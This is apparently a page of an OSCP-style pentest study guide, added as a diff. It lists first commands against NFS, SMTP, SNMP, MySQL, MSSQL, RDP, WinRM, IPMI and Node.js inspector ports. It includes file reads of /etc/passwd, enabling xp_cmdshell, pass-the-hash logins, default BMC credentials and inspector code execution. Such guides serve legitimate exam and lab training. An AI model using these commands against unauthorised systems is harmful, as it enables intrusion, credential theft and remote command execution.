@@ -1,0 +1,249 @@
+
+> <b>Purpose:</b> the services that are not SMB/HTTP/SSH still decide machines. One page for the first move on each: NFS, SMTP, SNMP, MySQL, MSSQL, RDP, WinRM, IPMI — plus exposed debug ports, which are a service too.
+
+## First move per service
+
+| Port | Service | First command | What pays |
+| --- | --- | --- | --- |
+| 2049 | NFS | <code>showmount -e</code> | exported shares, <code>no_root_squash</code> |
+| 25 | SMTP | <code>nc -nv … 25</code> | usernames via VRFY/RCPT |
+| 161/udp | SNMP | <code>snmpwalk -v2c -c public</code> | users, processes, interfaces, community strings |
+| 3306 | MySQL | <code>mysql -h … -u … -p</code> | databases, file read, auth bypass |
+| 1433 | MSSQL | <code>impacket-mssqlclient -windows-auth</code> | <code>xp_cmdshell</code>, linked servers |
+| 3389 | RDP | <code>xfreerdp</code> | desktop as a valid user |
+| 5985 | WinRM | <code>evil-winrm</code> | PowerShell shell as an admin |
+| 623/udp | IPMI | nmap <code>ipmi-version</code> | version → default creds |
+| 9229 | Node inspector | <code>node inspect</code> | remote code execution |
+
+## A. NFS
+
+### Step 01 — List exports
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+showmount -e <TARGET_IP>
+```
+
+<b>Look for:</b> <code>/export *</code> or a list of shares with allowed clients.<br /><b>Decision:</b> a share is exported to <code>*</code> or your subnet → Step 02. No output but 2049 is open → <code>rpcinfo -p <TARGET_IP></code>.<br /><b>Next:</b> Step 02.<br /><b>Common mistake:</b> skipping NFS because SMB was enumerated. Exports are often the shortest path to root.<br /><b>Evidence:</b> the <code>showmount</code> output.
+
+### Step 02 — Mount the export
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+sudo mkdir -p /mnt/nfs && sudo mount -t nfs <TARGET_IP>:/<SHARE> /mnt/nfs -o nolock
+ls -la /mnt/nfs
+# older servers sometimes need
+sudo mount -t nfs -o nolock,vers=3 <TARGET_IP>:/<SHARE> /mnt/nfs
+```
+
+<b>Look for:</b> the export's contents, especially <code>/home</code> backups or web roots.<br /><b>Decision:</b> <code>no_root_squash</code> in <code>/etc/exports</code> → the Linux PrivEsc SUID trick works. Writable share + cron → plant a payload.<br /><b>Next:</b> read credentials, or escalate via the Linux PrivEsc page.<br /><b>Common mistake:</b> mounting read-only and assuming the share is useless for privesc. Check <code>mount | grep nfs</code> for <code>rw</code>.<br /><b>Evidence:</b> <code>mount</code> output and the directory listing.
+
+## B. SMTP
+
+### Step 03 — Manual probe
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+nc -nv <TARGET_IP> 25
+# then, at the banner:
+VRFY <USERNAME>
+EXPN <USERNAME>
+MAIL FROM: <USERNAME>@<DOMAIN>
+RCPT TO: <USERNAME>@<DOMAIN>
+```
+
+<b>Look for:</b> <code>250 <USERNAME></code> (exists) vs <code>550</code> (does not). <code>252</code> means the server will not confirm.<br /><b>Decision:</b> VRFY answers → Step 04 to enumerate. VRFY disabled → try RCPT with a known domain.<br /><b>Next:</b> Step 04.<br /><b>Common mistake:</b> typing commands before reading the banner. Some servers require <code>EHLO <DOMAIN></code> first.<br /><b>Evidence:</b> the responses for a known-good and a known-bad user.
+
+### Step 04 — Enumerate users
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+smtp-user-enum -M VRFY -U <WORDLIST> -t <TARGET_IP>
+smtp-user-enum -M RCPT -U <WORDLIST> -D <DOMAIN> -t <TARGET_IP>
+```
+
+<b>Look for:</b> <code><USERNAME> exists</code>.<br /><b>Decision:</b> hits → valid usernames for spraying (Passwords & Hashes). No hits → the server blocks enumeration; move on.<br /><b>Next:</b> validate with a login attempt or spray.<br /><b>Common mistake:</b> using a generic wordlist that does not match the naming scheme. Derive names from the website and AD enumeration first.<br /><b>Evidence:</b> the <code>exists</code> lines.
+
+## C. SNMP
+
+### Step 05 — Walk with a community string
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+snmpwalk -v2c -c public <TARGET_IP>
+snmpwalk -v2c -c private <TARGET_IP>
+```
+
+<b>Look for:</b> <code>sysDescr</code>, <code>sysName</code>, running processes, installed software, user names, and sometimes credentials in descriptions.<br /><b>Decision:</b> data returns → Step 06 for targeted OIDs. <code>Timeout</code> → wrong community or ACL; try <code>onesixtyone</code>.<br /><b>Next:</b> Step 06.<br /><b>Common mistake:</b> giving up after <code>public</code>. Common strings are <code>private</code>, <code>internal</code>, <code>cisco</code>, <code>manager</code> — brute force them.<br /><b>Evidence:</b> the <code>sysDescr</code>/<code>sysName</code> values.
+
+### Step 06 — Targeted values and community brute force
+
+<b>Priority:</b> Conditional · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.1.5.0
+snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2
+onesixtyone -c <WORDLIST> <TARGET_IP>
+```
+
+<b>Look for:</b> the hostname, process list, and any community string that answers.<br /><b>Decision:</b> a valid community → full walk (Step 05). Nothing → SNMP is locked down; move on.<br /><b>Next:</b> use discovered names for spraying or note them as evidence.<br /><b>Common mistake:</b> assuming a failed walk means SNMP is closed. UDP 161 is often filtered from Kali but open from the pivot.<br /><b>Evidence:</b> the OID values and the working community string.
+
+## D. Databases
+
+### Step 07 — MySQL
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+mysql -h <TARGET_IP> -u <USERNAME> -p
+```
+
+```sql
+# once in the MySQL prompt
+SELECT user,host FROM mysql.user;
+SHOW DATABASES;
+SELECT LOAD_FILE('/etc/passwd');
+```
+
+<b>Look for:</b> passwordless <code>root@%</code>, application databases with credentials, <code>FILE</code> privilege.<br /><b>Decision:</b> <code>LOAD_FILE</code> works → read files as the DB user. <code>FILE</code> denied → look for credentials in the app's config instead.<br /><b>Next:</b> reuse database credentials on SSH/other services.<br /><b>Common mistake:</b> forgetting <code>-h</code>. Without it mysql tries the local socket and fails confusingly.<br /><b>Evidence:</b> the login, <code>SHOW DATABASES</code>, and the file read.
+
+### Step 08 — MSSQL
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+impacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -windows-auth
+```
+
+```text
+# once in the mssqlclient prompt
+SELECT @@version;
+enable_xp_cmdshell
+xp_cmdshell whoami
+```
+
+<b>Look for:</b> <code>sysadmin</code> role and a working <code>xp_cmdshell</code>.<br /><b>Decision:</b> <code>xp_cmdshell</code> disabled and you are sysadmin → <code>enable_xp_cmdshell</code>. Not sysadmin → check <code>EXECUTE AS LOGIN</code> impersonation.<br /><b>Next:</b> OS command execution as the SQL service account.<br /><b>Common mistake:</b> omitting <code>-windows-auth</code> against a domain-joined instance — it then tries SQL auth and fails.<br /><b>Evidence:</b> the version, the role, and the command output.
+
+## E. Remote access
+
+### Step 09 — RDP from Linux
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore +clipboard
+xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution /drive:share,/tmp
+```
+
+<b>Look for:</b> a desktop session as the user.<br /><b>Decision:</b> NLA error → try <code>/sec:tls</code> or <code>/sec:rdp</code>. <code>Account restrictions</code> → the user may need <code>Remote Desktop Users</code> membership.<br /><b>Next:</b> capture proof from the GUI (Exam Execution page).<br /><b>Common mistake:</b> connecting as a user who is not allowed RDP, then concluding the credential is bad. Test the credential over SMB/WinRM first.<br /><b>Evidence:</b> the session plus <code>whoami</code> in a terminal on the desktop.
+
+### Step 10 — WinRM shell
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>
+evil-winrm -i <TARGET_IP> -u <USERNAME> -H <NTHASH>
+```
+
+<b>Look for:</b> an <code>*Evil-WinRM*</code> prompt.<br /><b>Decision:</b> connection refused → 5985 closed; use RDP, SMB execution, or WMI.<br /><b>Next:</b> enumerate as that user, then escalate.<br /><b>Common mistake:</b> assuming any valid credential works over WinRM. The account needs <code>Remote Management Users</code> or <code>Administrators</code>.<br /><b>Evidence:</b> the prompt and <code>whoami</code>.
+
+## F. IPMI
+
+### Step 11 — Version probe
+
+<b>Priority:</b> Conditional · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+nmap -sU -p623 --script ipmi-version <TARGET_IP>
+```
+
+<b>Prerequisites:</b> the probe itself only needs <code>nmap</code>; the credential test in the decision below needs <code>ipmitool</code> (<code>sudo apt install ipmitool</code>), which is <b>not</b> installed on the build host used for this audit.<br /><b>Look for:</b> <code>IPMI version: 2.0</code> and the BMC banner.<br /><b>Decision:</b> IPMI 2.0 → test default credentials (<code>ADMIN/ADMIN</code>, <code>root/calvin</code>) with <code>ipmitool</code> — <b>ipmitool is not installed here</b>, so install it or use the pivot's tooling.<br /><b>Next:</b> authenticated IPMI → possible BMC-level access.<br /><b>Common mistake:</b> scanning UDP through proxychains. SOCKS carries TCP only — run the UDP probe from the pivot.<br /><b>Evidence:</b> the nmap script output.
+
+## G. Exposed debug ports
+
+### Step 12 — Node.js inspector
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target · <b>Status:</b> Documented
+
+```bash
+# from a process list, spot an inspector port
+ps aux | grep -- --inspect
+# attach a debugger from the target
+node inspect 127.0.0.1:9229
+```
+
+```text
+# in the debugger REPL, execute in the target's context
+exec('process.getuid()')
+exec('require("child_process").execSync("id").toString()')
+```
+
+<b>Look for:</b> <code>Debugger attached</code> and the command output from the <b>target</b> process.<br /><b>Decision:</b> the inspector listens on <code>127.0.0.1</code> only → you need local access or a tunnel (Tunneling & Pivoting). Bound to <code>0.0.0.0</code> → reachable directly.<br /><b>Next:</b> use the code execution to read flags or escalate.<br /><b>Common mistake:</b> connecting to the HTTP port with a browser. The inspector protocol is WebSocket; use <code>node inspect</code> or the Chrome DevTools <code>devtools://</code> endpoint.<br /><b>Evidence:</b> the command output and the process command line that exposed the port.
+
+## H. Decision tree
+
+| Finding | Do this | Do <b>not</b> |
+| --- | --- | --- |
+| 2049 open | <code>showmount -e</code> (Step 01) | Assume it needs credentials |
+| SMTP 25 | VRFY/RCPT probe (Steps 03-04) | Brute force passwords first |
+| 161/udp answers | Walk + targeted OIDs (Steps 05-06) | Ignore process lists |
+| 3306 | Try root/no password (Step 07) | Assume it is firewalled |
+| 1433 | <code>mssqlclient -windows-auth</code> (Step 08) | Use SQL auth on a domain instance |
+| 3389 | xfreerdp (Step 09) | Conclude a credential is bad from one RDP error |
+| 5985 | evil-winrm (Step 10) | Use psexec on a WinRM-only host |
+| 623/udp | nmap ipmi-version (Step 11) | Proxy a UDP scan |
+| <code>--inspect</code> in ps | Attach and <code>exec</code> (Step 12) | Treat it as a normal HTTP port |
+
+## I. Troubleshooting
+
+| Symptom | Cause | Fix |
+| --- | --- | --- |
+| <code>showmount: RPC: Port mapper failure</code> | 111/2049 filtered | Try from the pivot |
+| NFS mount hangs | Version mismatch | <code>-o vers=3,nolock</code> |
+| SMTP VRFY <code>252</code> | Server refuses to confirm | Use RCPT with a domain |
+| SNMP <code>Timeout</code> | Wrong community / ACL | <code>onesixtyone</code>, try from pivot |
+| MySQL <code>Access denied</code> | Wrong host grant | Try <code>root@localhost</code> from the target |
+| MSSQL TLS error | Old encryption | Add <code>-ssl</code>/<code>-port 1433</code> variants; check the instance port |
+| RDP <code>credSSP</code> error | NLA | <code>/cert:ignore</code>, or update FreeRDP |
+| WinRM 5985 refused | Service disabled | Use SMB/WMI instead |
+
+<b>Pivoting variant.</b> Most of these are TCP and work through proxychains:
+
+```bash
+proxychains4 mysql -h <TARGET_IP> -u <USERNAME> -p
+proxychains4 xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore
+proxychains4 evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>
+```
+
+SNMP (161/udp) and IPMI (623/udp) are <b>UDP</b> and will not traverse a SOCKS proxy — run those from the pivot host itself. RDP over a proxy is slow; expect a laggy desktop.
+
+## J. Evidence to preserve
+
+- The service version and the exact command that produced a lead.
+- Credentials recovered from configs, SNMP strings, or database rows.
+- For GUI access: a screenshot showing the desktop and host identity.
+- For NFS: the export options, especially <code>no_root_squash</code>.
+
+## K. Related pages
+
+- <mention url="https://app.notion.com/p/4011e51238b581669e09d615530aa92a" /> — service/version detection
+- <mention url="https://app.notion.com/p/4011e51238b58177854fcfe83c31ef5d" /> — NFS <code>no_root_squash</code>
+- Post-Exploitation & Lateral Movement — MSSQL/WinRM follow-up
+- <mention url="https://app.notion.com/p/4011e51238b581469eede872cfb47724" /> — reaching these services
+- OSCP Attack Workflow — Start Here
+
+## L. References
+
+- HackTricks network services: [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-network.html](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-network.html)
+- Impacket mssqlclient: [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
+- evil-winrm: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
+
+## M. Verification note
+
+<code>showmount</code>, <code>mount.nfs</code>, <code>smtp-user-enum</code>, <code>nc</code>, <code>snmpwalk</code>, <code>onesixtyone</code>, <code>mysql</code>, <code>impacket-mssqlclient</code>, <code>xfreerdp</code>, <code>evil-winrm</code> and <code>nmap</code> are installed here; their flags were checked against local help or the documented interface, so those steps are <b>Syntax Checked</b>. <code>ipmitool</code> is <b>not installed</b>, so Step 11's follow-up is <b>Documented</b>. The Node.js inspector technique is reconstructed from the old stub and was not executed — also <b>Documented</b>. Nothing was run against a live target, so no step is <b>Lab Tested</b>.
